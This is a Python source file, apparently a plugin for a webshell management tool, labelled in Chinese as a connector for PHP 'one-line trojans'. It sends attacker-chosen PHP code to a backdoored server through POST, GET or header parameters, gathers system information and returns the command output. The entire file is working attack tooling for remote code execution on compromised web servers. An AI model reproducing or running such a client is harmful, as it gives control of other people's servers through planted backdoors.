from typing import Any, Dict, Union

import requests
from api import Plugin, Session, CodeExecutor, ServerInfo, OSType, Command, SessionType, logger
import json, base64

def get_plugin_class():
    return AdvancedExecutor

class AdvancedExecutor(Plugin, CodeExecutor):
    name = "一句话木马连接器"
    description = '用于和一句话木马连接'
    supported_session_types = [SessionType.PHP]
    options = {
        'password':['c', '一句话木马密码'],
        'password_type':['POST', '当前一句话木马的类型，支持POST、GET、HEADER方式'],
    }

    def __init__(self):
        pass

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    def get_server_info(self) -> ServerInfo:
        data = self.session.evalfile('payload/server_info')
        info = json.loads(data)
        for k, v in info.items():
            if isinstance(v, str):
                info[k] = base64.b64decode(v.encode()).decode(self.session.options.get_option('encoding'))
            if k == 'os_type':
                if 'linux' in info[k].lower():
                    info[k] = OSType.UNIX
                elif 'window' in info[k].lower():
                    info[k] = OSType.WINDOWS
                else:
                    info[k] = OSType.OTHER
        return ServerInfo.from_dict(info)

    def get_end_payload(self, payload:bytes)->bytes:
        """获取将Payload执行结果输出到页面的代码

        Args:
            payload (bytes): 待处理Payload代码

        Returns:
            bytes: 最终Payload代码
        """
        if self.session.session_type == SessionType.PHP:
            payload += b'echo call_run();'
        elif self.session.session_type == SessionType.ASP_NET_CS:
            payload = r'''
            public class Wheabck {
                public static void Run(){
                    
                }
            }
            '''
        return payload

    def eval(self, payload: bytes, timeout: float) -> Union[bytes, None]:
        pwd = self.session.options.get_option('password')
        url = self.session.options.get_option('target')
        pwd_type:str = self.session.options.get_option('password_type').upper()
        payload = self.get_end_payload(payload)
        try:
            if pwd_type == 'POST':
                return requests.post(url, data={pwd:payload}, timeout=timeout if timeout else None).content
            elif pwd_type == 'GET':
                return requests.get(url, params={pwd:payload}, timeout=timeout if timeout else None).content
            elif pwd_type == 'HEADER':
                return requests.get(url, headers={pwd.upper():payload}, timeout=timeout if timeout else None).content
            else:
                logger.error(f"错误的密码类型，密码类型只能是POST、GET和HEADER！")
                return None
        except Exception as e:
            logger.error(f"发生了异常：{e}")

        return None

    def generate(self, config: Dict[str, Any]) -> bytes:
        return super().generate(config=config)

        